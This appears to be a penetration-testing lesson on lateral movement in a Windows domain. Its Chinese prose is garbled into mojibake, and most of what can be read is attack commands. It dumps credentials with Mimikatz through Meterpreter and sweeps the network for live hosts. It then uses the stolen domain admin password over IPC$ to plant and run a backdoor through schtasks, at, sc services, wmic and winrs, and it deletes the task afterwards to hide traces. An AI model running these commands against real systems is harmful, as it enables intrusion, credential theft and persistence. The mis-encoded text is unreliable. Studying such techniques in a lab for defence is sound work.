# ç¬¬48è¯¾ï¼šåˆ©ç”¨Windowså†…ç½®å·¥å…·è¿›è¡Œæ¨ªå‘ç§»åŠ¨ ğŸš€

åœ¨æœ¬èŠ‚è¯¾ä¸­ï¼Œæˆ‘ä»¬å°†å­¦ä¹ å¦‚ä½•åˆ©ç”¨Windowsæ“ä½œç³»ç»Ÿå†…ç½®çš„å·¥å…·ï¼Œåœ¨å·²ç»è·å–ä¸€å°ä¸»æœºæƒé™çš„åŸºç¡€ä¸Šï¼Œå‘ç½‘ç»œå†…çš„å…¶ä»–ä¸»æœºè¿›è¡Œæ¨ªå‘ç§»åŠ¨ã€‚æˆ‘ä»¬å°†é‡ç‚¹ä»‹ç»IPC$å…±äº«è¿æ¥ã€è®¡åˆ’ä»»åŠ¡ã€SCå‘½ä»¤ã€WMICä»¥åŠWinRMç­‰å·¥å…·çš„ä½¿ç”¨æ–¹æ³•ã€‚

## æ¦‚è¿°

![](img/fb9f3abd5c122b216896ee19ad4d6814_1.png)

æ¨ªå‘ç§»åŠ¨æ˜¯æ¸—é€æµ‹è¯•å’Œå†…ç½‘æ¸—é€ä¸­çš„å…³é”®ç¯èŠ‚ã€‚å½“æˆ‘ä»¬æˆåŠŸæ§åˆ¶ä¸€å°ä¸»æœºï¼ˆè·³æ¿æœºï¼‰åï¼Œä¸‹ä¸€æ­¥å°±æ˜¯åˆ©ç”¨è¿™å°ä¸»æœºä½œä¸ºè·³æ¿ï¼Œå»è®¿é—®å’Œæ§åˆ¶åŒä¸€ç½‘ç»œå†…çš„å…¶ä»–ä¸»æœºã€‚Windowsç³»ç»Ÿè‡ªå¸¦äº†è®¸å¤šå¼ºå¤§çš„ç®¡ç†å·¥å…·ï¼Œå¯ä»¥ç”¨äºå®ç°è¿™ä¸€ç›®çš„ï¼Œè€Œæ— éœ€å€ŸåŠ©å¤–éƒ¨è½¯ä»¶ã€‚

![](img/fb9f3abd5c122b216896ee19ad4d6814_3.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_5.png)

ä¸Šä¸€èŠ‚æˆ‘ä»¬ä»‹ç»äº†ä¿¡æ¯æ”¶é›†å’Œæƒé™æå‡ï¼Œæœ¬èŠ‚ä¸­æˆ‘ä»¬æ¥çœ‹çœ‹å¦‚ä½•åˆ©ç”¨å·²è·å–çš„å‡­è¯è¿›è¡Œæ¨ªå‘ç§»åŠ¨ã€‚

![](img/fb9f3abd5c122b216896ee19ad4d6814_7.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_9.png)

## 1. ä¿¡æ¯æ”¶é›†ä¸å‡­è¯è·å– ğŸ”

![](img/fb9f3abd5c122b216896ee19ad4d6814_11.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_13.png)

åœ¨å¼€å§‹æ¨ªå‘ç§»åŠ¨ä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦ä»å·²æ§åˆ¶çš„ä¸»æœºä¸Šæ”¶é›†ä¿¡æ¯ï¼Œç‰¹åˆ«æ˜¯è·å–å¯ç”¨äºç™»å½•å…¶ä»–ä¸»æœºçš„å‡­è¯ã€‚

æˆ‘ä»¬å·²ç»é€šè¿‡Meterpreterä¼šè¯è·å–äº†`SYSTEM`æƒé™ã€‚æ¥ä¸‹æ¥å¯ä»¥è¿›è¡Œä¿¡æ¯æ”¶é›†ã€‚

![](img/fb9f3abd5c122b216896ee19ad4d6814_15.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_17.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_19.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_21.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_22.png)

ä»¥ä¸‹æ˜¯è·å–å½“å‰ä¸»æœºæ˜æ–‡å¯†ç çš„å‡ ç§æ–¹æ³•ï¼Œä½¿ç”¨Mimikatzæ¨¡å—ï¼š

![](img/fb9f3abd5c122b216896ee19ad4d6814_24.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_26.png)

```
meterpreter > load kiwi
meterpreter > creds_all
```

![](img/fb9f3abd5c122b216896ee19ad4d6814_28.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_29.png)

æ‰§è¡Œ`creds_all`å‘½ä»¤åï¼Œå¯èƒ½ä¼šè¿”å›ç±»ä¼¼ä»¥ä¸‹çš„ä¿¡æ¯ï¼Œå…¶ä¸­åŒ…å«åŸŸç”¨æˆ·`Administrator`çš„æ˜æ–‡å¯†ç ï¼š
```
Domain: DE1
User: Administrator
Password: Password123!
```

![](img/fb9f3abd5c122b216896ee19ad4d6814_31.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_33.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_35.png)

æˆ‘ä»¬è¿˜å¯ä»¥å°è¯•å…¶ä»–å‘½ä»¤æ¥è·å–å“ˆå¸Œæˆ–æ˜æ–‡ï¼š
```
meterpreter > lsa_dump_sam
meterpreter > lsa_dump_secrets
```

![](img/fb9f3abd5c122b216896ee19ad4d6814_37.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_39.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_41.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_43.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_45.png)

é€šè¿‡ä»¥ä¸Šæ–¹æ³•ï¼Œæˆ‘ä»¬å¾—åˆ°äº†åŸŸ`DE1`çš„ç®¡ç†å‘˜è´¦å·`Administrator`åŠå…¶å¯†ç ã€‚ç”±äºåŸŸç®¡ç†å‘˜è´¦å·å¯ä»¥ç™»å½•åŸŸå†…çš„ä»»ä½•ä¸»æœºï¼Œå› æ­¤è¿™äº›å‡­è¯å¯¹æˆ‘ä»¬è¿›è¡Œæ¨ªå‘ç§»åŠ¨è‡³å…³é‡è¦ã€‚

![](img/fb9f3abd5c122b216896ee19ad4d6814_47.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_49.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_51.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_53.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_55.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_57.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_58.png)

## 2. æ¢æµ‹å†…ç½‘å­˜æ´»ä¸»æœº ğŸ“¡

![](img/fb9f3abd5c122b216896ee19ad4d6814_60.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_62.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_64.png)

åœ¨å°è¯•è¿æ¥å…¶ä»–ä¸»æœºå‰ï¼Œæˆ‘ä»¬éœ€è¦çŸ¥é“ç›®æ ‡ç½‘ç»œä¸­æœ‰å“ªäº›ä¸»æœºæ˜¯å­˜æ´»çš„ã€‚

![](img/fb9f3abd5c122b216896ee19ad4d6814_66.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_68.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_70.png)

æˆ‘ä»¬å¯ä»¥ä»å·²è·å–çš„Meterpreterä¼šè¯ä¸­ï¼Œä½¿ç”¨shellå‘½ä»¤è¿›è¡Œå†…ç½‘ä¸»æœºå­˜æ´»æ¢æµ‹ï¼š
```
meterpreter > shell
C:\> for /L %i in (1,1,254) do @ping -n 1 -w 50 10.10.10.%i | findstr "TTL"
```

![](img/fb9f3abd5c122b216896ee19ad4d6814_72.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_74.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_76.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_78.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_80.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_82.png)

å‡è®¾æ¢æµ‹å‘ç°IPåœ°å€ä¸º`10.10.10.201`çš„ä¸»æœºå­˜æ´»ï¼Œå¹¶ä¸”å®ƒå¼€æ”¾äº†`445`ç«¯å£ï¼ˆæ–‡ä»¶å…±äº«æœåŠ¡ï¼‰å’Œ`135`ç«¯å£ï¼ˆRPCæœåŠ¡ï¼‰ï¼Œè¿™æ»¡è¶³äº†IPC$è¿æ¥çš„åŸºæœ¬æ¡ä»¶ã€‚

![](img/fb9f3abd5c122b216896ee19ad4d6814_84.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_86.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_88.png)

## 3. åˆ©ç”¨IPC$è¿›è¡Œæ¨ªå‘ç§»åŠ¨ ğŸ”—

![](img/fb9f3abd5c122b216896ee19ad4d6814_90.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_92.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_94.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_96.png)

IPC$ï¼ˆè¿›ç¨‹é—´é€šä¿¡ï¼‰å…±äº«æ˜¯Windowsç”¨äºç®¡ç†è¿œç¨‹è®¡ç®—æœºçš„éšè—å…±äº«ã€‚å»ºç«‹IPC$è¿æ¥åï¼Œå¯ä»¥è¿›è¡Œæ–‡ä»¶æ“ä½œã€å‘½ä»¤æ‰§è¡Œç­‰ã€‚

![](img/fb9f3abd5c122b216896ee19ad4d6814_98.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_100.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_102.png)

### å»ºç«‹IPC$è¿æ¥

![](img/fb9f3abd5c122b216896ee19ad4d6814_103.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_105.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_107.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_109.png)

é¦–å…ˆï¼Œæ£€æŸ¥å¹¶æ¸…ç†å¯èƒ½å­˜åœ¨çš„æ—§è¿æ¥ï¼Œç„¶åä½¿ç”¨è·å–çš„åŸŸç®¡ç†å‘˜å‡­è¯å»ºç«‹æ–°è¿æ¥ï¼š
```
C:\> net use \\10.10.10.201\IPC$ /delete
C:\> net use \\10.10.10.201\IPC$ Password123! /user:DE1\Administrator
```
å‘½ä»¤æˆåŠŸæ‰§è¡Œï¼Œè¡¨ç¤ºè¿æ¥å·²å»ºç«‹ã€‚

![](img/fb9f3abd5c122b216896ee19ad4d6814_111.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_113.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_115.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_117.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_119.png)

### IPC$è¿æ¥çš„åº”ç”¨

![](img/fb9f3abd5c122b216896ee19ad4d6814_121.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_123.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_125.png)

å»ºç«‹è¿æ¥åï¼Œæˆ‘ä»¬å¯ä»¥è¿›è¡Œå¤šç§æ“ä½œï¼š

![](img/fb9f3abd5c122b216896ee19ad4d6814_127.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_129.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_131.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_133.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_135.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_136.png)

**è®¿é—®è¿œç¨‹æ–‡ä»¶ç³»ç»Ÿï¼š**
```
C:\> dir \\10.10.10.201\C$
```

![](img/fb9f3abd5c122b216896ee19ad4d6814_138.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_140.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_142.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_144.png)

**ä¸Šä¼ æ–‡ä»¶åˆ°è¿œç¨‹ä¸»æœºï¼š**
```
C:\> copy C:\test.exe \\10.10.10.201\C$\test.exe
```

![](img/fb9f3abd5c122b216896ee19ad4d6814_146.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_147.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_149.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_151.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_153.png)

**ä»è¿œç¨‹ä¸»æœºä¸‹è½½æ–‡ä»¶ï¼š**
```
C:\> copy \\10.10.10.201\C$\important.txt C:\local_copy.txt
```

![](img/fb9f3abd5c122b216896ee19ad4d6814_155.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_157.png)

**æŸ¥çœ‹è¿œç¨‹ä¸»æœºæ—¶é—´ï¼ˆä¸ºè®¡åˆ’ä»»åŠ¡åšå‡†å¤‡ï¼‰ï¼š**
```
C:\> net time \\10.10.10.201
```

![](img/fb9f3abd5c122b216896ee19ad4d6814_159.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_161.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_163.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_165.png)

## 4. åˆ©ç”¨è®¡åˆ’ä»»åŠ¡æ‰§è¡Œå‘½ä»¤ â°

![](img/fb9f3abd5c122b216896ee19ad4d6814_167.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_169.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_171.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_173.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_175.png)

è®¡åˆ’ä»»åŠ¡ï¼ˆ`schtasks` æˆ– `at`ï¼‰å…è®¸æˆ‘ä»¬åœ¨è¿œç¨‹ä¸»æœºä¸Šå®šæ—¶æ‰§è¡Œå‘½ä»¤æˆ–ç¨‹åºï¼Œä»è€Œè·å–åå‘Shellã€‚

![](img/fb9f3abd5c122b216896ee19ad4d6814_177.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_178.png)

### ä½¿ç”¨ schtasks å‘½ä»¤

é¦–å…ˆï¼Œå°†åé—¨ç¨‹åºé€šè¿‡IPC$è¿æ¥ä¸Šä¼ åˆ°ç›®æ ‡ä¸»æœºã€‚ç„¶åï¼Œåˆ›å»ºè®¡åˆ’ä»»åŠ¡ç«‹å³æ‰§è¡Œå®ƒï¼š
```
C:\> schtasks /create /s 10.10.10.201 /u DE1\Administrator /p Password123! /sc minute /mo 1 /tn "BackdoorTask" /tr "C:\test.exe" /ru SYSTEM
```
*   `/s`: æŒ‡å®šè¿œç¨‹ä¸»æœºã€‚
*   `/u` å’Œ `/p`: æä¾›ç”¨æˆ·åå’Œå¯†ç ã€‚
*   `/sc minute /mo 1`: è®¾ç½®ä¸ºæ¯åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡ã€‚
*   `/tn`: ä»»åŠ¡åç§°ã€‚
*   `/tr`: è¦æ‰§è¡Œçš„ç¨‹åºè·¯å¾„ã€‚

![](img/fb9f3abd5c122b216896ee19ad4d6814_180.png)

ä»»åŠ¡åˆ›å»ºåï¼Œç­‰å¾…å…¶æ‰§è¡Œï¼Œå³å¯åœ¨æ”»å‡»æœºï¼ˆå¦‚Metasploitï¼‰ä¸Šæ”¶åˆ°æ¥è‡ª`10.10.10.201`çš„åå‘Shellè¿æ¥ã€‚

![](img/fb9f3abd5c122b216896ee19ad4d6814_182.png)

**æ¸…ç†ç—•è¿¹ï¼š**
```
C:\> schtasks /delete /s 10.10.10.201 /u DE1\Administrator /p Password123! /tn "BackdoorTask"
```

![](img/fb9f3abd5c122b216896ee19ad4d6814_184.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_186.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_188.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_190.png)

### ä½¿ç”¨ at å‘½ä»¤ï¼ˆæ—§ç³»ç»Ÿï¼‰

![](img/fb9f3abd5c122b216896ee19ad4d6814_192.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_193.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_195.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_196.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_198.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_200.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_201.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_202.png)

åœ¨Windows Server 2008æˆ–Win7ç­‰ç³»ç»Ÿä¸Šï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨`at`å‘½ä»¤ï¼š
```
C:\> net time \\10.10.10.201
C:\> at \\10.10.10.201 21:10 C:\test.exe
```
æ­¤å‘½ä»¤ä¼šåœ¨è¿œç¨‹ä¸»æœºçš„`21:10`æ‰§è¡Œ`C:\test.exe`ã€‚

![](img/fb9f3abd5c122b216896ee19ad4d6814_204.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_206.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_208.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_210.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_212.png)

## 5. åˆ©ç”¨SCå‘½ä»¤ç®¡ç†æœåŠ¡ âš™ï¸

![](img/fb9f3abd5c122b216896ee19ad4d6814_214.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_216.png)

SCå‘½ä»¤å¯ä»¥è¿œç¨‹åˆ›å»ºã€å¯åŠ¨ã€åœæ­¢æœåŠ¡ã€‚æˆ‘ä»¬å¯ä»¥åˆ›å»ºä¸€ä¸ªæœåŠ¡æ¥æ‰§è¡Œæˆ‘ä»¬çš„åé—¨ç¨‹åºã€‚

![](img/fb9f3abd5c122b216896ee19ad4d6814_218.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_220.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_222.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_224.png)

**åœ¨è¿œç¨‹ä¸»æœºä¸Šåˆ›å»ºæœåŠ¡ï¼š**
```
C:\> sc \\10.10.10.201 create BackdoorService binpath= "cmd /c C:\test.exe" start= auto
```

**å¯åŠ¨è¿œç¨‹æœåŠ¡ï¼š**
```
C:\> sc \\10.10.10.201 start BackdoorService
```
æœåŠ¡å¯åŠ¨åï¼Œä¼šæ‰§è¡Œ`binpath`æŒ‡å®šçš„å‘½ä»¤ï¼Œä»è€Œè§¦å‘æˆ‘ä»¬çš„åé—¨ã€‚

![](img/fb9f3abd5c122b216896ee19ad4d6814_226.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_228.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_230.png)

**æŸ¥è¯¢æœåŠ¡çŠ¶æ€ï¼š**
```
C:\> sc \\10.10.10.201 qc BackdoorService
```

![](img/fb9f3abd5c122b216896ee19ad4d6814_232.png)

## 6. åˆ©ç”¨WMICæ‰§è¡Œå‘½ä»¤ ğŸ’»

WMICï¼ˆWindowsç®¡ç†å·¥å…·å‘½ä»¤è¡Œï¼‰æ”¯æŒè¿œç¨‹æ‰§è¡Œå‘½ä»¤ã€‚ä½†é»˜è®¤æ— å›æ˜¾ï¼Œé€šå¸¸ç”¨äºåˆ›å»ºè¿›ç¨‹ã€‚

![](img/fb9f3abd5c122b216896ee19ad4d6814_234.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_236.png)

**åœ¨è¿œç¨‹ä¸»æœºä¸Šåˆ›å»ºè¿›ç¨‹ï¼ˆä¾‹å¦‚å¯åŠ¨è®¡ç®—å™¨ï¼‰ï¼š**
```
C:\> wmic /node:10.10.10.201 /user:DE1\Administrator /password:Password123! process call create "calc.exe"
```
æ­¤å‘½ä»¤ä¼šè¿”å›åˆ›å»ºçš„è¿›ç¨‹IDã€‚

![](img/fb9f3abd5c122b216896ee19ad4d6814_238.png)

**ç»“åˆåå¼¹Shellå‘½ä»¤ï¼š**
æˆ‘ä»¬å¯ä»¥å°†`calc.exe`æ›¿æ¢ä¸ºä»»ä½•èƒ½åœ¨ç›®æ ‡æœºå™¨ä¸Šæ‰§è¡Œçš„å‘½ä»¤ï¼Œä¾‹å¦‚ä¸€ä¸ªé€šè¿‡`certutil`æˆ–`powershell`ä¸‹è½½å¹¶æ‰§è¡ŒPayloadçš„å‘½ä»¤ï¼Œä»è€Œç›´æ¥è·å–åå‘Shellã€‚

![](img/fb9f3abd5c122b216896ee19ad4d6814_240.png)

## 7. åˆ©ç”¨WinRMæ‰§è¡Œå‘½ä»¤ ğŸŒ

![](img/fb9f3abd5c122b216896ee19ad4d6814_242.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_244.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_246.png)

WinRMï¼ˆWindowsè¿œç¨‹ç®¡ç†ï¼‰æ˜¯Windowsçš„è¿œç¨‹ç®¡ç†æœåŠ¡ï¼Œé»˜è®¤åœ¨2012åŠä»¥ä¸Šç‰ˆæœ¬å¼€å¯ï¼Œå…è®¸è¿œç¨‹æ‰§è¡ŒPowerShellå‘½ä»¤ã€‚

![](img/fb9f3abd5c122b216896ee19ad4d6814_248.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_250.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_252.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_253.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_255.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_257.png)

**é¦–å…ˆï¼Œåœ¨ç›®æ ‡ä¸»æœºä¸Šå¯ç”¨WinRMï¼ˆå¦‚æœéœ€è¦ï¼‰ï¼š**
```
C:\> winrm quickconfig
C:\> winrm set winrm/config/client @{TrustedHosts="*"}
```

![](img/fb9f3abd5c122b216896ee19ad4d6814_259.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_261.png)

**ä½¿ç”¨WinRSæ‰§è¡Œå‘½ä»¤ï¼ˆæœ‰å›æ˜¾ï¼‰ï¼š**
```
C:\> winrs -r:http://10.10.10.201:5985 -u:DE1\Administrator -p:Password123! ipconfig
```
æ­¤å‘½ä»¤ä¼šè¿œç¨‹æ‰§è¡Œ`ipconfig`å¹¶è¿”å›ç»“æœã€‚

**ä½¿ç”¨WinRMçš„Invoke-WmiMethodåˆ›å»ºè¿›ç¨‹ï¼ˆæ— å›æ˜¾ï¼‰ï¼š**
```
C:\> powershell -Command "$cred = Get-Credential; Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'calc.exe' -ComputerName 10.10.10.201 -Credential $cred"
```
åŒæ ·ï¼Œå¯ä»¥å°†`calc.exe`æ›¿æ¢ä¸ºåå¼¹Shellçš„å‘½ä»¤ã€‚

![](img/fb9f3abd5c122b216896ee19ad4d6814_263.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_264.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_265.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_267.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_269.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_271.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_273.png)

**ä½¿ç”¨WinRMåˆ›å»ºå¹¶å¯åŠ¨æœåŠ¡ï¼š**
é€šè¿‡PowerShellï¼Œå¯ä»¥è¿œç¨‹è°ƒç”¨WMIåˆ›å»ºå’Œå¯åŠ¨æœåŠ¡æ¥æ‰§è¡Œåé—¨ï¼ŒåŸç†ä¸SCå‘½ä»¤ç±»ä¼¼ã€‚

![](img/fb9f3abd5c122b216896ee19ad4d6814_275.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_277.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_279.png)

## æ€»ç»“

![](img/fb9f3abd5c122b216896ee19ad4d6814_281.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_283.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_285.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_286.png)

æœ¬èŠ‚è¯¾æˆ‘ä»¬ä¸€èµ·å­¦ä¹ äº†åˆ©ç”¨Windowså†…ç½®å·¥å…·è¿›è¡Œæ¨ªå‘ç§»åŠ¨çš„å¤šç§æ–¹æ³•ï¼š
1.  **IPC$å…±äº«è¿æ¥**ï¼šç”¨äºå»ºç«‹è¿œç¨‹ç®¡ç†é€šé“ï¼Œè¿›è¡Œæ–‡ä»¶ä¼ è¾“å’ŒåŸºç¡€ä¿¡æ¯è·å–ã€‚
2.  **è®¡åˆ’ä»»åŠ¡ï¼ˆschtasks/atï¼‰**ï¼šç”¨äºåœ¨è¿œç¨‹ä¸»æœºä¸Šå®šæ—¶æ‰§è¡Œæˆ‘ä»¬çš„Payloadã€‚
3.  **SCå‘½ä»¤**ï¼šç”¨äºè¿œç¨‹åˆ›å»ºå’Œå¯åŠ¨æœåŠ¡ï¼Œä»¥ç³»ç»Ÿæƒé™æ‰§è¡Œå‘½ä»¤ã€‚
4.  **WMIC**ï¼šç”¨äºåœ¨è¿œç¨‹ä¸»æœºä¸Šåˆ›å»ºè¿›ç¨‹ï¼ˆæ— å›æ˜¾ï¼‰ã€‚
5.  **WinRM**ï¼šå¼ºå¤§çš„è¿œç¨‹ç®¡ç†åè®®ï¼Œå¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼ˆæœ‰å›æ˜¾ï¼‰å’Œç®¡ç†è¿œç¨‹æœåŠ¡ã€‚

![](img/fb9f3abd5c122b216896ee19ad4d6814_288.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_290.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_292.png)

![](img/fb9f3abd5c122b216896ee19ad4d6814_294.png)

è¿™äº›æ–¹æ³•çš„æ ¸å¿ƒæ€è·¯éƒ½æ˜¯ï¼š**åˆ©ç”¨ä»å·²æ§ä¸»æœºè·å–çš„é«˜æƒé™å‡­è¯ï¼Œé€šè¿‡Windowsè‡ªå¸¦çš„ç®¡ç†åŠŸèƒ½ï¼Œåœ¨è¿œç¨‹ä¸»æœºä¸Šæ‰§è¡Œä»£ç **ã€‚æŒæ¡è¿™äº›æŠ€æœ¯å¯¹äºç†è§£å†…ç½‘æ¸—é€çš„æ¨ªå‘ç§»åŠ¨è‡³å…³é‡è¦ã€‚è¯·å¤§å®¶åŠ¡å¿…åœ¨å®éªŒç¯å¢ƒä¸­äº²æ‰‹æ“ä½œä¸€éï¼Œä»¥åŠ æ·±ç†è§£ã€‚